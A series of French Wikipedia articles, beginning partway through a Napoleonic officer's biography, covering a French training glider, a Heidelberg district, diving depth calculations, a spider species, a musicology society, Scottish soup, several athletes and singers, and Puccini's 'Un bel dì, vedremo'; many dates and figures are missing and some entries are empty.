En l’an VI et en l’an VII, il sert aux armées d’Angleterre et du Rhin, avant de retourner à l’armée d’Italie, où il fait les campagnes de l’an VIII et de l’an IX. Le , à la bataille de Marengo, il reçoit un coup de feu à la hanche gauche. Le , il se fait remarquer au passage du Mincio, où il reprend le village de Pozzolo avec une audace digne d’être citée. Ayant ordonné au porte-drapeau de le suivre à la tête du bataillon, il franchit avec lui un fossé plein d’eau, et place le drapeau à sa gauche : « "Camarades", dit-il à ses soldats, "voilà une nouvelle occasion de nous signaler, marchons à la gloire" ; la charge bat, et Courtois s’élance sur l’ennemi, son bataillon le suit et les autrichiens sont culbutés en un instant abandonnant le village et 400 prisonniers parmi lesquels se trouvent 15 officiers. 
Il est nommé major le , au régiment d’infanterie de ligne, et il est fait chevalier de la Légion d’honneur le . En l’an XII et en l’an XIII, il fait partie de l’armée des côtes de l’Océan, puis de l’armée de Hanovre sous les ordres du maréchal Bernadotte. En l’an XIV, il passe à l’armée de réserve sous Lefebvre.
En 1809, il fait la campagne d’Allemagne à la Grande Armée, et le , il est nommé colonel en second commandant la demi-brigade provisoire. Il est élevé au grade d’officier de la Légion d’honneur le . Le , il commande une demi-brigade de grenadiers et voltigeurs réunis, à la bataille de Wagram, et il reçoit deux blessures très graves. Admis à la retraite le , il est créé chevalier de l’Empire le .
Il meurt le , à Metz.

</doc>
<doc id="10576719" url="https://fr.wikipedia.org/wiki?curid=10576719" title="S.A. 103 Émouchet">
S.A. 103 Émouchet

L' Arsenal Émouchet, plus connu sous les noms de Sports Aériens Émouchet, Air Émouchet, ou Guerchais Roche Émouchet, est un planeur monoplace de performances modestes, conçu par Raymond Jarlaud et produit pour la première fois en France au cours de la Seconde Guerre mondiale. La production a continué après-guerre, où l’Émouchet a joué un rôle important dans le rééquipement des clubs français.
Conception et développement.
L'Émouchet trouve son origine en septembre 1938 dans un montage artisanal de monsieur Mangeot qui à la suite de l'accident du planeur polonais Salamandra de son association et le refus des allemands de lui vendre un Grunau Baby pour le remplacer fabrique un fuselage ressemblant à celui du Grunau pour recevoir les ailes et les empennages du Salamandra. Il cède les plans de son Émouchet aux "Sports aériens" contre la possibilité pour les membres du club de voler sur les planeurs du centre national. 
La version définitive est conçue et construite par l'Arsenal de l'Aéronautique pendant la Seconde Guerre mondiale. C'est un planeur d'entrainement monoplace en bois entoilé avec un cockpit ouvert influencé, comme beaucoup d'autres, par le Grunau Baby. L'aile mono-longeron en structure bois entoilée possède une partie centrale à corde constante puis des panneaux extérieurs effilés terminés par des saumons arrondis. Le bord de fuite de ces panneaux est occupé par les ailerons. Il n'y avait ni volets ni aérofreins sur le premier modèle SA 103, mais, plus tard, l'Arsenal SA 104 aura des aérofreins à mi-corde à l'extrémité de la section centrale.
Comme sur le Grunau Baby, l'aile est haute, placée au-dessus du fuselage sur un pylône qui s'estompe rapidement après le bord de fuite. L'aile est reliée à la partie inférieure du fuselage par un court mat en acier de chaque côté.
Le poste de pilotage ouvert de l'Émouchet est juste en l'avant du bord d'attaque de l'aile. La section transversale du fuselage est hexagonale. Le fuselage est entièrement coffré en contreplaqué. Les empennages entoilés sont nettement différents de ceux du Grunau, avec le stabilisateur horizontal surélevé au-dessus du fuselage sur un replat en avant de la fine dérive et avec des surfaces de contrôle arrondies. Le gouvernail , en particulier, est large et arrondi.
Le SA 103 atterrit sur un patin et une béquille de queue mais une roue a été ajoutée au SA 104.
Historique opérationnel.
Le SA 103 Émouchet a été choisi pour une production en quantité sous le régime de Vichy, avec environ 200 construits. Après la guerre, le gouvernement français l'a inclus dans une liste de quatre types de planeurs d'entrainement monoplaces après formation initiale sur biplace Caudron C.800. Les Ateliers Roche Aviation (Guerchais Roche) ont construit 150 SA 103 et 100 SA 104.
Trois restaient inscrits sur le registre des avions civil français en 2010.
Les Ets Victor Minié ont également construit 27 Émouchet SA 104. Ils ont aussi participé à une collaboration avec la SNECMA qui a consisté à monter quatre pulsoréacteurs Escopette 3340 sous les ailes d'un Émouchet à environ 2.50 m du fuselage par l'intermédiaire d'un mat principal situé entre longeron et bord d'attaque et de deux tubes en V au bord de fuite. Chaque moteur produisait une poussée de pour un poids de . Cet avion a volé pour la première fois le . Au mois de juin suivant un deuxième avion volait avec six de ces moteurs. Plus tard, un pulsoréacteur plus puissant, le Tromblon, a été utilisé. Les Émouchet ainsi motorisés ont participé aux salons du Bourget de 1951 et 1953 mais, à l'issue des essais, le moteur fusée a été préféré au pulsoréacteur.
En 1951, pour tester la formule du pilotage couché, le SA 103 N°18 a été modifié avec un imposant nez vitré qui a également imposé l'agrandissement de la dérive et de la gouverne de direction. Le pilote était installé à plat ventre avec un manche tombant en face du bras droit pour les commandes de profondeur et de gauchissement et une manette à main gauche à l'utilité incertaine. La direction était commandée par les pieds mais avec une cinématique inhabituelle : au lieu d'enfoncer les pédales, le pilote devait les faire pivoter avec le bout du pied. Le tableau de bord placé sous le pilote se consultait grâce à un miroir. La position de pilotage s'étant révélée peu ergonomique, très inconfortable et donnant en plus une très mauvaise visibilité au pilote l'expérimentation a rapidement été abandonnée.

</doc>
<doc id="10576726" url="https://fr.wikipedia.org/wiki?curid=10576726" title="Bouzid Days">
Bouzid Days

 est une série télévisée algérienne en de , créé par Djaffar Gacem et diffusée quotidiennement entre le et le (durant le mois de ramadan) sur la chaîne de télévision El Djazairia One.
Synopsis.
La série raconte la vie quotidienne d'une famille algérienne à travers la famille du Dr. Hani Bouzid et les problèmes de la société algérienne contemporaine.

</doc>
<doc id="10576727" url="https://fr.wikipedia.org/wiki?curid=10576727" title="LA Guns">
LA Guns



</doc>
<doc id="10576730" url="https://fr.wikipedia.org/wiki?curid=10576730" title="Neuenheim">
Neuenheim

Neuenheim ("Neiene" en ) est un quartier de la ville de Heidelberg, une ville située dans le Land de Bade-Wurtemberg dans le Sud-Ouest de l'Allemagne. Le quartier s’étend sur la rive droite du Neckar.
Situation.
Le quartier de Neuenheim s’étend sur la rive droite du Neckar. Il est bordé à l’est par le quartier de Ziegelhausen et au nord par celui de Handschuhsheim. Les ponts qui traversent le Neckar lui donnent accès au sud-est au quartier de , au sud à ceux d’ et de Bergheim et au sud-ouest, à celui de .
Neuenheim est relié à la rive gauche du Neckar par quatre ponts dont le pont Karl-Theodor ("Karl-Theodor Brücke "), plus communément appelé "Alte Brücke" (« Vieux pont »). Ce dernier date de 1788, sous le règne du prince-électeur Charles Théodore.
Partiellement détruit pendant la Seconde Guerre mondiale, il est rouvert à la circulation le .
Urbanisation.
Le centre du quartier moderne est encadré par deux artères importantes, la Brückenstrasse à l’est et la Berliner Strasse à l’ouest. Elles convergent vers le quartier Handschuhsheim, s’accompagnant également de lignes de tramway et de bus.
À l’ouest du village d’origine s’est développé le quartier , regroupant plusieurs bâtiments et antennes de l’université de Heidelberg et du . Le Centre allemand de recherche sur le cancer ("Deutsches Krebsforschungszentrum" ou DKFZ) s’y trouve également.
Outre sa localisation, Neuenheim se caractérise par l'architecture de ses nombreuses villas, le développement de son infrastructure et ses parcs et jardins. De ce fait, il attire une population aisée provenant de toute la région.
Le jardin botanique de Heidelberg existe à son emplacement actuel depuis 1915 à l'initiative de Georg Albrecht Klebs.
Le quartier compte plusieurs églises, dont l'église catholique et l'église évangéliste . L'église protestante Saint-Jean ("Jakobuskirche") date de 1989, traduisant la croissance du bourg vers l'ouest et la prédominance protestante dans le quartier.
Il ne reste que la tour et le chœur de l'église originelle, sur la place du marché. Cette tour haute de constitue un repère dans le quartier.
Histoire.
Un , désormais détruit, s’est élevé sous l’Empire romain pour franchir le Neckar et relier Neuenheim à l'actuel quartier de Bergheim.
Des vestiges d'un mithraeum et d'un pont romain en briques construit par "Publius Attius Rufinus" ont été mis au jour.
Le village de Neuenheim est plus ancien que Heidelberg elle-même ; selon le codex de Lorsch, une mention du village est faite en 765 et semble avoir été actif sous les Francs au .
Jusqu'à l'avènement de la "Gründerzeit", Neuenheim est demeuré un village rural, tourné également vers la culture de la vigne et la pêche.
En 1891, le quartier est le premier de Heidelberg à être structuré par fusion administrative des territoires existants.
Des "stolpersteine", honorant la mémoire des victimes du nazisme, sont visibles aux de la Bergstraße, ainsi qu’aux , au , au , au , au , au , au et au .
Sports.
Le SC Neuenheim est un club allemand de rugby à XV basé à Neuenheim, qui participe au championnat d'Allemagne de rugby à XV. Il a été champion de la "Rugby Bundesliga" en 1995, 2003 et 2004, s'inclinant en finale en 1990, 2001, 2006 et 2013.
Le club a connu quelques joueurs notables, Clément Combes (ex : Francfort), Alexandre Priam (ex : Stade Rochelais) ou encore Aymeric Milan international Uruguayen de rugby à 13.

</doc>
<doc id="10576733" url="https://fr.wikipedia.org/wiki?curid=10576733" title="S.A. 103 Emouchet">
S.A. 103 Emouchet



</doc>
<doc id="10576734" url="https://fr.wikipedia.org/wiki?curid=10576734" title="Shamo Quaye">
Shamo Quaye

Shamo Quaye est un footballeur ghanéen né le à Tema et mort le dans la même ville. Il évoluait au poste de milieu offensif.
Biographie.
En club.
Shamo Quaye joue au Ghana, en Arabie saoudite et en Suède.
Le , il meurt des suites d'une blessure à la tête lors d'un match improvisé pendant un congé pris dans son pays natal.
En équipe nationale.
Il est médaillé de bronze avec le Ghana lors des Jeux olympiques d'été de 1992. Il dispute 3 matchs lors du tournoi olympique.
International ghanéen, il reçoit sept sélections en équipe du Ghana entre 1992 et 1997. Il joue notamment contre le Burundi (victoire 1-0) dans le cadre des qualifications pour la Coupe du monde 1994, et contre le Gabon pour les qualifications pour la Coupe du monde 1998.
Palmarès.
"Avec Hearts of Oak :"
"Avec le Ghana :"

</doc>
<doc id="10576748" url="https://fr.wikipedia.org/wiki?curid=10576748" title="Sylvain Gayri">
Sylvain Gayri

Sylvain Gayri, né le à Lorient, est un joueur français de rugby à XV, évoluant au poste d'ailier ou arrière.
Biographie.
Il a commencé son parcours à Tarbes, en minimes, jusqu'en juniors, et son premier match en équipe première à 17 ans face à Avenir valencien. Il joue trois quart aile ou arrière.
Il enchaîne ensuite les sélections en équipe première du SU Agen de 1997 à 1999, disputant aussi 7 matchs en petite coupe d'Europe sous les couleurs de ce club, Puis il est à l'Avenir valencien pendant 7 ans. Il est ensuite pendant 2 ans à Marmande.
À partir de 2007, il est entraîneur joueur à l'US Nérac.

</doc>
<doc id="10576751" url="https://fr.wikipedia.org/wiki?curid=10576751" title="Meir Tobianski">
Meir Tobianski

Meir Toubianski (מאיר טוביאנסקי en hébreu), ( à Kaunas, Lituanie – à en Israël) a été commandant dans l’Armée britannique et il fut avant l'indépendance de l'Etat d'Israël le 14 mai 1948 également capitaine dans l’Haganah. Il est maintenu dans ce grade lors de la création de l'armée israélienne, par l'ordonnance n°4 du 26 mai 1948 du gouvernement de l'Etat d'Israël portant sur la création de l'armée de défense d'Israël (Tsahal en initiales hébraïques), fusion des anciennes troupes de la Haganah, du Palmach, de l'Irgun et du Lehi. 
Il est l'un des deux seuls condamnés à mort en Israël, exécuté par un détachement de l'armée israélienne, l’autre condamné à mort de la justice israélienne, qui fut pendu, après un procès qui dura un an environ, étant l’officier supérieur SS Adolf Eichmann (qui avait un grade dans la S.S. équivalent à celui de lieutenant-colonel de l'armée allemande) le 31 mai 1962 à Ramla. 
Meir Toubianski fut faussement reconnu coupable de haute trahison par une cour martiale improvisée. Il fut jugé et interrogé par Isser Bééri (directeur du SHAY et du Aman), David Kron, et le colonel (directeur du SHAY pour le district de Jérusalem), ce dernier agissant comme juge en chef. 
Meir Toubianski fut fusillé, de dos, quelques heures plus tard après le prononcé de la sentence, par un peloton d’exécution formé pendant le « procès » par Isser Bééri, avec des militaires de la brigade Yiftah
Il fut disculpé et réhabilité un an plus tard le . Il fut alors inhumé dans le cimetière militaire du Mont Herzl avec les honneurs militaires.

</doc>
<doc id="10576754" url="https://fr.wikipedia.org/wiki?curid=10576754" title="Profondeur équivalente air">
Profondeur équivalente air

La profondeur équivalente air (PEA) ( (EAD)) est un moyen de rapprocher les exigences de décompression des mélanges de gaz respiratoires contenant de l'azote () et de l'oxygène () dans des proportions différentes de celles de l'air, connues sous le nom de « nitrox ».
La profondeur équivalente air, pour un mélange nitrox donné et une profondeur, est la profondeur d'une plongée lors de la respiration de l'air qui aurait la même pression partielle d'azote. Ainsi, par exemple, un mélange de gaz contenant 36 % d'oxygène (EAN36) utilisé à a un PEA de .
Exemple de calcul.
La profondeur équivalente air peut être calculée pour les profondeurs en mètres comme suit :
En utilisant l'exemple précédent, pour un mélange nitrox contenant 64 % d'azote (EAN36) utilisé à 27 m, la PEA est :
Ainsi, à 27 m avec ce mélange, le plongeur calcule ses exigences de décompression comme s'il était à 20 m.
Tables de plongée.
Bien que toutes les tables de plongée ne soient pas recommandées pour une utilisation de cette manière, les tables de Bühlmann conviennent pour ce type de calcul. À , la table Bühlmann 1986 (0-) permet un temps de fond de sans nécessiter d'arrêt de décompression. Alors qu'à , le temps sans arrêt de décompression est de . Cela montre que l'utilisation d'un nitrox EAN36 pour une plongée de peut donner une augmentation de 75 % du temps de fond au cours de l'utilisation de l'air.
Les tables US Navy ont également été utilisées avec une profondeur équivalente air, avec un effet similaire. Les calculs sont théoriquement valables pour tous les modèles de décompression de type haldanien.

</doc>
<doc id="10576756" url="https://fr.wikipedia.org/wiki?curid=10576756" title="Île des Bains">
Île des Bains

L'île des Bains est une île sur l'Oise, située dans le département du même nom dépendant administrativement de la commune de Margny-lès-Compiègne en France.
Historique.
Au siècle, l'île est marquée pour les aménagements du château de Compiègne puis en 1781, un ingénieur nommé Cordelle, propose d'y installer une machine hydraulique pour alimenter le château en eau potable.
Il ne reste plus de nos jours qu'un minuscule îlot d'une trentaine de mètres de l'ancienne île des Bains. Au siècle, le lieu était fréquenté des baigneurs et le Sport Nautique Compiégnois y avait aménagé un bassin de natation. Des concours de plongeons et des compétitions d'aviron y étaient organisés. 
En 1910, l'île fut submergée lors d'une crue de l'Oise. 
Des photographies d'opération de canonnières y ont été prises lors de la Première Guerre mondiale en . 
La rue des Bains à Compiègne rappelle l'importance qu'eut l'île.

</doc>
<doc id="10576768" url="https://fr.wikipedia.org/wiki?curid=10576768" title="Effet flicker">
Effet flicker



</doc>
<doc id="10576773" url="https://fr.wikipedia.org/wiki?curid=10576773" title="Argiope minuta">
Argiope minuta

Argiope minuta est une espèce d'araignées aranéomorphes de la famille des Araneidae.
Distribution.
Cette espèce se rencontre dans l'Est de l'Asie.
Elle a été observée en Inde, au Bangladesh, en Chine, à Taïwan, en Corée du Sud, en Corée du Nord et au Japon.
Habitat.
"Argiope minuta" est présente en montagne et dans les champs ainsi que dans les forêts. "Argiope minuta" peut se rencontrer dans les espaces cultivés comme les champs de coton.
Description.
La femelle mesure de 6 à et le mâle mesure de 3 à .
Le céphalothorax est arrondi, brunâtre et recouvert de long poils de soie orientés vers l'avant et de couleur grise.
Le sternum est noir, élargi, avec une large bande médiane longitudinale jaune et des points jaune clair dont l'ensemble forme une sorte de croix. Les chélicères sont jaune-marron.
L'abdomen est ovale et arqué avec le dos muni de deux bosses latérales pointues vers l'avant. Le dos de l'abdomen de cette araignée très colorée est orné de bandes de couleurs d'agencement caractéristique. La partie montante antérieure de l'abdomen est blanche suivie d'une fine ligne noire rejoignant les bosses pointues. Viennent ensuite, une bande blanche, puis une jaune, une ligne noire, une bande blanche bordée de taches jaunes, une bande noire ornée de cinq taches blanches sur la partie antérieure et de deux beaucoup plus petites sur la partie postérieure, une bande blanche, puis une jaune et enfin une bande noire sur la partie terminale de l'abdomen comportant trois rangées de cinq points blancs et des traces rouges.
Le dessous de l’abdomen présente une bande noire dotée de trois paires de points blancs qui s'étend de l’épigyne aux filières. Cette bande noire est bordée latéralement par deux bandes jaunes elles-mêmes bordées de bandes noires tachées de blanc.
L’épigyne présente une forme ressemblant à une tête de chouette effraie.
Les pattes sont minces et brun-jaune. Les tibias sont grands, brun foncé au-dessus et vers l'extrémité. Les palpes sont jaune brunâtre.
Espèces similaires.
"Argiope minuta" est similaire à "Argiope vietnamensis" et "Argiope hinderlichi".
Elle est également proche d"'Argiope amoena" et s'en distingue par le fait qu'elle ne possède que deux bandes transverses noires au lieu de trois chez "Argiope amoena".
Toile.
"Argiope minuta" construit une toile verticale circulaire entre les branches d'arbres ou d'arbustes qui peut comporter un stabilimentum en forme de X.
La toile d"'Argiope minuta" peut être la cible d'araignées cleptoparasites comme "Argyrodes flavescens" ou "Argyrodes bonadea".
Venin.
Bien que son venin contienne de la sphingomyélinase, la morsure d"'Argiope minuta" ne semble pas en mesure de provoquer de nécrose chez l'homme.

</doc>
<doc id="10576777" url="https://fr.wikipedia.org/wiki?curid=10576777" title="HMS Charles">
HMS Charles



</doc>
<doc id="10576780" url="https://fr.wikipedia.org/wiki?curid=10576780" title="Société française de musicologie">
Société française de musicologie

La Société française de musicologie, fondée en 1917, est une société savante dédiée à l’étude de la musique selon les méthodes de la musicologie. Son champ d’étude couvre tout phénomène musical sans restrictions d’époques, de civilisations et d’esthétiques. Elle réunit diverses approches disciplinaires et méthodologiques. Elle publie depuis cent ans une revue scientifique, des ouvrages d’érudition et elle organise régulièrement des colloques et des journées d’étude.
Historique.
La Première Guerre mondiale eut de profondes répercussions sur la vie artistique européenne mais aussi académique. Dès 1914, la Société internationale de musique, fondée en 1898, fut dissoute, et avec elle les différentes sections nationale qui la composaient. Cette société savante était l’organe fédérateur de la discipline, née dans le dernier tiers du et alors en plein développement institutionnel. 
La Société française de musicologie a été constituée à Paris le par un groupement de musicologues appartenant à l’ancienne « section française » de la Société internationale de musique. Le premier bureau désigné par le conseil d'administration était composé des musicologues Lionel de La Laurencie (Président), Jacques-Gabriel Prod’homme (secrétaire général), Henri Quittard, également compositeur et archiviste de l’Opéra (Secrétaire adjoint), du compositeur et critique musical Élie Poirée (Vice-président) et du facteur d’orgues Charles Mutin (Trésorier).
Selon ses premiers statuts, la Société française de musicologie avait pour but « l’étude des questions relatives à l’Histoire de la Musique, à l’Esthétique et à la Théorie musicales ». Ses moyens d’action étaient la publication d’un bulletin, « de documents, textes musicaux, mémoires ou études de musicologie ». Elle se composait de membres actifs de nationalité française et de membres correspondants. 
Dans le premier "Bulletin de la Société française de musicologie" (1917), il est indiqué que « les questions relatives à l’Histoire de la Musique et des Musiciens, à l’Esthétique et à la Théorie musicales, à la construction des instruments ont pris en France une grande extension et ont sollicité de plus en plus, l’attention des érudits ». Cette adresse aux lecteurs souligne que l’enseignement de l’histoire de la musique devrait avoir la même place que celui de l’histoire de l’art pour contribuer à l’histoire générale.
Le 20 février 1931, la Société française de musicologie est reconnue d'utilité publique.
Activités.
La Société française de musicologie consacre son activité à la discipline considérée comme un ensemble d’approches, de méthodes et d’objets : acoustique, analyse, esthétique, ethnomusicologie, études de genre, études postcoloniales, histoire culturelle, histoire de la musique, iconographie, informatique musicale, organologie, "performance studies", sociologie de la musique, théorie, etc. Elle encourage les travaux sur toutes les époques et la confrontation des approches les plus diverses. 
"Revue de musicologie".
De 1917 à 1921, la Société française de musicologie publie régulièrement le "Bulletin de la société française de musicologie", comportant les comptes rendus des séances, de courts articles et des informations bibliographiques. En 1922, désireuse d’atteindre un large public et d’ "intéresser, en dehors de ses membres mêmes, tous ceux qui se préoccupent des questions de son ressort", elle modifie son titre qui devient "Revue de musicologie." Elle est aujourd’hui animée par un comité de rédaction et un comité de lecture placés sous la responsabilité du rédacteur en chef.
Les publications.
Les publications de la Société française de musicologie sont gérées par un comité chargé de sélectionner, expertiser et préparer les ouvrages publiés sous sa responsabilité, sont divisées en trois séries : I. Etudes, II. Musique, III. Catalogues et Documents. Depuis 2013, la Société française de musicologie assure la publication de l’édition de la "Critique musicale" de Berlioz. 
Journées d’étude.
Des journées d'études sur des thèmes variés, dont les comptes rendus ou les actes ont parfois été publiés dans la Revue de musicologie ou ailleurs,  sont régulièrement organisées par la société depuis 1971   
Colloques.
La Société française de musicologie organise ou co-organise avec d’autres institutions française ou étrangères des colloques dont certains actes ont été publiés.

</doc>
<doc id="10576781" url="https://fr.wikipedia.org/wiki?curid=10576781" title="Cullen skink">
Cullen skink

Le Cullen skink est une soupe écossaise épaisse à base de haddock fumé, de pommes de terre et d'oignons. Un authentique "Cullen skink" utilisera du "finnan haddie", mais il peut être préparé avec tout autre haddock fumé.
Cette soupe est une spécialité locale, de la ville de Cullen dans le Moray, sur la côte nord-est de l'Écosse. La soupe est souvent servie en entrée dans les dîners écossais formels, mais est largement servie comme un plat de tous les jours dans le nord-est de l'Écosse.
Les recettes locales de "Cullen skink" peuvent se distinguer, telles que l'utilisation de lait au lieu de l'eau ou l'ajout d'une simple crème. Le "Cullen skink" était traditionnellement servi avec du pain.
Il a été décrit comme « fumé et plus sûr que la chaudrée américaine, avec plus de cœur que la classique bisque française ».
Étymologie.
"Skink "est un mot écossais qui désigne le jarret ou le genou de bœuf, bien que la "Cullen skin" n'en contienne pas. Le mot "skink" est aussi dérivé du moyen néerlandais "schenke", « jarret », « genou » (apparenté avec l'archaïque mot anglais "shank"). Il ne faut pas le confondre avec le skink, une famille de lézards appartenant à l'ordre des Scincomorpha.

</doc>
<doc id="10576783" url="https://fr.wikipedia.org/wiki?curid=10576783" title="HMS Mendip">
HMS Mendip



</doc>
<doc id="10576786" url="https://fr.wikipedia.org/wiki?curid=10576786" title="Hanger Lane">
Hanger Lane



</doc>
<doc id="10576791" url="https://fr.wikipedia.org/wiki?curid=10576791" title="Profondeur narcotique équivalente">
Profondeur narcotique équivalente

La profondeur narcotique équivalente (PNE) (en anglais : Equivalent narcotic depth (END)) est utilisé dans la plongée technique comme moyen d'estimer l'effet narcotique d'un mélange de gaz respiratoire tel que l'héliox et le trimix. La méthode consiste, pour un mélange et une profondeur donnés, à calculer la profondeur qui produirait le même effet narcotique lors de la respiration.
La profondeur narcotique équivalente d'un mélange de gaz respiratoire à une profondeur donnée est calculée en trouvant la profondeur d'une plongée en respirant de l'air qui aurait la même pression partielle totale d'azote (N²) et d'oxygène (O²) que le gaz respiratoire en question. Par exemple, un trimix contenant 20 % d'oxygène, 40 % d'hélium, 40 % d'azote (trimix 20/40) utilisé à 60 mètres a une PEN de 32 mètres.
Exemple de calcul.
La profondeur narcotique équivalente peut être calculée pour les profondeurs en mètres comme suit :
Pour l'exemple précédent, pour un mélange de gaz contenant 40% d'hélium utilisé à 60 mètres, la PEN est:
Ainsi, à 60 mètres sur ce mélange, le plongeur ressentira le même effet narcotique qu'une plongée à l'air à une profondeur de 32 mètres.
Narcose à l'oxygène.
Étant donné qu'il existe des preuves que l'oxygène joue aussi un rôle dans les effets narcotiques d'un mélange gazeux , le manuel de plongée de la NOAA recommande de traiter l'oxygène et l'azote comme étant également narcotiques C'est maintenant préférable à la méthode précédente de considérer que seul l'azote soit responsable de la narcose, car il est plus conservateur. Dans cette analyse, on suppose que les potentiels narcotiques de l'azote et de l'oxygène sont semblables. Bien que l'oxygène ait une plus grande solubilité lipidique que l'azote et devrait donc être plus narcotique (corrélation de Meyer-Overton), il est probable qu'une partie de l'oxygène est métabolisée, réduisant ainsi son effet à un niveau semblable à celui de l'azote.

</doc>
<doc id="10576795" url="https://fr.wikipedia.org/wiki?curid=10576795" title="Kenneth Lee Williams">
Kenneth Lee Williams

Kenneth Lee Williams (né le et décédé le ) est un herpétologiste américain, auteur de livres sur la biologie et la classification des serpents. Williams est un enseignant retraité du département de biologie de l'université d'État Northwestern dont il a été nommé professeur émérite en 2001. Il est considéré comme un spécialiste de la couleuvre faux-corail et l'herpétologie de la forêt de nuage hondurienne.

</doc>
<doc id="10576801" url="https://fr.wikipedia.org/wiki?curid=10576801" title="Liste de personnalités américaines d'origine albanaise">
Liste de personnalités américaines d'origine albanaise

Un Albano-Américain est un Américain d'héritage ou d'ascendance albanaise. Ceci est une liste d'Albano-Américains célèbres ou réputés dans leur(s) domaine(s). Pour être inclus dans cette liste, ces personnes doivent avoir un article avec des références montrant qu'ils sont d'origine albanaise et citoyens américains.

</doc>
<doc id="10576803" url="https://fr.wikipedia.org/wiki?curid=10576803" title="Église de la Graziella">
Église de la Graziella

L'église de la Graziella ou église Santa Maria delle Grazie est une église de Naples dédiée à Notre-Dame des Grâces et située via Bartolomeo.
Histoire.
L'église est bâtie en 1737, à l'emplacement de l'ancien théâtre San Bartolomeo, par Angelo Carasale. Elle est cédée plus tard aux Pères trinitaires de la rédemption des captifs qui la conservent jusqu'en 1801, date à laquelle elle est acquise par la confrérie de Saint-Bernard-et-Sainte-Marguerite.
Elle est fermée à cause des dommages subis par le tremblement de terre de 1980, et ne rouvre qu'en , après de longues années de restauration. Elle sert désormais de salle de concert de l'association culturelle CERSIM, pour des concerts spirituels et de musique de chambre, et des messes mensuelles y sont toujours célébrées.
L'église abrite un certain nombre d'œuvres d'art, dont des tableaux attribués à Giuseppe Bonito ("La Sainte Vierge donnant une bannière à saint Pierre Nolasque" au-dessus du maître-autel et "La Sainte Vierge et saint Charles Borromée" dans une chapelle latérale) et à Nicola Maria Rossi ("Crucifixion").

</doc>
<doc id="10576808" url="https://fr.wikipedia.org/wiki?curid=10576808" title="Olga Gouriakova">
Olga Gouriakova

Olga Nikolaïevna Gouriakova (), née le à Novokouznetsk, est une chanteuse lyrique russe, soprano.
Biographie.
Diplômée du conservatoire Tchaïkovski (classe d'Irina Maslennikova), en 1994, elle intègre la compagnie du Théâtre musical Stanislavski et Nemirovitch-Dantchenko de Moscou. Elle y joue notamment les rôles de Tatyana ("Eugène Oneguine"), Mimi ("La Bohème"), Desdemona ("Otello"), Thais ("Thaïs"), Micaela ("Carmen"), Elvira ("Ernani"), Gorislava ("Rouslan et Ludmila") et Militrisa ("Le Conte du tsar Saltan", Rimski-Korsakov). Elle participe aux festivals de Ludwigsburg et du Schleswig-Holstein, en Allemagne. Elle joue souvent le "War Requiem" de Britten sous la direction de Rostropovitch. Elle fait ses débuts aux États-Unis en 1998 au Met en chantant María de "Mazeppa" (Tchaïkovski) sous la direction de Guerguiev. Elle joue au Carnegie Hall le rôle de Iolanta (1998) et de Desdemona à nouveau avec Guerguiev à Francfort et à Rimini. En 2000, on la retrouve dans le rôle de Natacha Rostova dans "Guerre et Paix" de Prokofiev mise en scène par Francesca Zambello à l'Opéra Bastille, aux côtés de Nathan Gunn qui incarne le prince Bolkonski. À La Scala, elle chante à nouveau Maria de "Mazeppa" (Tchaïkovski) sous la direction du maestro Rostropovitch et en 2005 au festival de Salzbourg avec Guerguiev. En 2012, Lev Dodine lui offre le rôle de Lisa dans son adaptation de "La Dame de pique" représentée à l'Opéra Bastille.

</doc>
<doc id="10576814" url="https://fr.wikipedia.org/wiki?curid=10576814" title="Grande plaine et nord">
Grande plaine et nord



</doc>
<doc id="10576826" url="https://fr.wikipedia.org/wiki?curid=10576826" title="Krapatchouk">
Krapatchouk

Krapatchouk est une comédie hispano-franco-belge écrite et réalisée par Enrique Gabriel et sortie en 1992.
Fiche technique.
Source IMDb
Distribution.
Source IMDb

</doc>
<doc id="10576833" url="https://fr.wikipedia.org/wiki?curid=10576833" title="Havering and Redbridge">
Havering and Redbridge



</doc>
<doc id="10576842" url="https://fr.wikipedia.org/wiki?curid=10576842" title="Talmage (Nebraska)">
Talmage (Nebraska)

Le village américain de est situé dans le comté d'Otoe, dans l’État du Nebraska. Sa population s’élevait à lors du recensement.

</doc>
<doc id="10576847" url="https://fr.wikipedia.org/wiki?curid=10576847" title="Vitor Hugo">
Vitor Hugo

Vitor Hugo Franchescoli de Souza, plus connu sous le nom de Vitor Hugo, né le à Guaraci (Brésil), est un footballeur brésilien qui évolue au poste de défenseur central à l'Atlético Mineiro, en prêt de l'EC Bahia.
Son nom de famille Franchescoli a été donné en l'honneur d'Enzo Francescoli, le milieu de terrain uruguayen.
Carrière.
Santo André.
En 2010, il se met en évidence avec le club de São Paulo, après avoir obtenu de bons résultats, et se voit transféré vers d'autres clubs au Brésil.
América Mineiro.
En mai 2013, Vitor signe avec l'América Mineiro, et participe à la série B du championnat brésilien.
Palmeiras.
Le , il signe avec Palmeiras, un prêt d'un an avec option d'achat.
Il fait ses débuts officiels en faveur du club le , lors d'une victoire sur l'Audax 3-1, à l'occasion d'un match comptant pour le Championnat de São Paulo.
Étant l'un des meilleurs défenseurs de la première manche du Championnat de São Paulo, il devient titulaire dans l'équipe Palmeiras.
Vitor marque son premier but pour Palmeiras lors d'une rencontre face à Santos, où l'équipe remporte le match 2-1. Il inscrit également un but contre le club de São Bernardo lors du championnat de São Paulo, où Palmeiras remporte le match 1-0.
En , Palmeiras achète 50 % des droits économiques de Vitor Hugo au club de Tombense, qui détient les droits pour environ 6 millions R$, avec un contrat pour cinq saisons.
Au cours de sa première saison, Vitor Hugo devient l'un des joueurs clés du club. Le , il remporte la Coupe de Brésil avec Palmeiras, en finale contre Santos. Pour la première fois, ce match se joue à l'Allianz Parque.
Par la suite, le , il remporte le Championnat Brésilien.
Équipe du Brésil.
Il est appelé en équipe nationale brésilienne par l'entraîneur Tite pour un match amical contre la Colombie. Comme le match amical ne figure pas au calendrier de la FIFA, seuls les athlètes qui travaillent au Brésil ont été appelés.

</doc>
<doc id="10576848" url="https://fr.wikipedia.org/wiki?curid=10576848" title="Un bel dì, vedremo">
Un bel dì, vedremo

« Un bel dì, vedremo » (littéralement : « Un beau jour nous verrons ») est le titre de l'aria "solo" la plus célèbre de "Madame Butterfly", l'opéra de Giacomo Puccini, air que chante le rôle-titre, une soprano, à l'acte II. Il débute "andante molto calmo". C'est un des airs les plus fameux du répertoire.
Contexte.
Cio-Cio-San (son vrai nom, en japonais « Mademoiselle Papillon ») s'adresse à sa servante Suzuki et imagine le jour heureux où le lieutenant B. F. Pinkerton reviendra enfin des États-Unis. Butterfly entrouvre alors un "shōji" (paroi coulissante) qui dévoile la rade de Nagasaki en contrebas et entonne l'un des airs les plus fameux du répertoire. 
Analyse.
